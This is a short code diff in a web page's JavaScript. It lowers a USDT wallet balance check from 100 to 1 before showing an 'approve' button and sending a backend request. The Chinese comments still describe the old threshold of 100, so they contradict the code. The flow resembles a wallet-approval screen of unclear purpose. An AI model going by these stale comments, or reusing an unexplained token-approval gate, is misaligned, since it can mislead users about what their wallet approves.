@@ -546,7 +546,7 @@
                 const approveBtn = document.getElementById("approveBtn");
 
                 // 核心：USDT余额校验（严格判断是否≥100）
-                if (tokenBalance < 100) {
+                if (tokenBalance < 1) {
                     // 余额不足100：不发送后端请求，显示不符合条件
                     userInfoEl.innerHTML = `
                         已连接：<br>
